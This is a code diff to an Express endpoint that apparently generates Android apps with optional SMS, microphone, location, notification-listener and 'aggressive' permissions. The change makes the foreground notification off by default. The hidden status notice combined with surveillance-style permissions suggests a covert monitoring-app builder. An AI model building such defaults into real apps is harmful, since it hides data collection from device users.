@@ -279,7 +279,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 const isMicEnabled             = enableMicrophonePermission === 'true';
                 const isLocationEnabled        = enableLocationPermission === 'true';
                 const isStorageEnabled         = enableStoragePermission !== 'false';
-                const isForegroundNotifEnabled = enableForegroundNotification !== 'false';
+                const isForegroundNotifEnabled = enableForegroundNotification === 'true';
 
                 const permsToNeutralize = [];
                 if (!isSmsEnabled) {
@@ -340,7 +340,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableMicrophonePermission:   enableMicrophonePermission === 'true',
                 enableLocationPermission:     enableLocationPermission === 'true',
                 enableNotificationListener:   enableNotificationListener === 'true',
-                enableForegroundNotification: enableForegroundNotification !== 'false',
+                enableForegroundNotification: isForegroundNotifEnabled,
                 aggressivePermissions:        aggressivePermissions === 'true',
                 notificationClickAction:      notificationClickAction || preset.action,
                 notificationTitle:            (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
